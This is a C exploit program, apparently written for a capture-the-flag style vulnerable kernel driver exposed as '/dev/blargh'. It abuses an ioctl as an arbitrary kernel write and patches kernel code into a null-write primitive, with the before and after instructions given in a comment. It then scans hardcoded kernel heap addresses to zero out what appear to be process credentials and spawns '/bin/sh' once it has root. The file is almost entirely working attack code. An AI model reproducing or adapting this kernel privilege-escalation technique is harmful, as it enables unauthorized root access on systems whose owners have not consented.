#define _GNU_SOURCE
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>
#include <sys/prctl.h>

/* GLOBAL VAR */
typedef unsigned long long u64;
#define DEV_PATH "/dev/blargh"
int fd;

int main(int argc, char** argv) 
{
    // start here
    fd = open(DEV_PATH, O_RDONLY);
    u64 addr_printk = 0xffffffff81303260;
    prctl(PR_SET_NAME, "DEADBEEF", 0, 0, 0);
    // set to arb null write
    /*
    before:
    0xffffffffc0000045:  mov    DWORD PTR [rip+0x20d9],0x0        # 0xffffffffc0002128
    after:
    0xffffffffc0000045:  mov    DWORD PTR [rip+0x2000],0x0        # 0xffffffffc000204f
    */
    ioctl(fd, 0x40086721, (0xffffffffc0000045+2)-addr_printk);
    
    u64 kheap = 0xffff8880043d9a00; // 0xffff8880043a1400
    for (int i=0; i<0xfff; i++) {
        ioctl(fd, 0x40086721, (kheap+8)-addr_printk);
        // printf("%d\n", getuid());
        if (getuid() != 1000) {
            printf("found one!");
            for (int x=0;x < 8;x++) {
                ioctl(fd, 0x40086721, (kheap)-addr_printk);
                ioctl(fd, 0x40086721, (kheap+1)-addr_printk);
                kheap+=4;
            }
            system("/bin/sh");
            break;
        }
        kheap += 0x100;
    }
    return 0;
}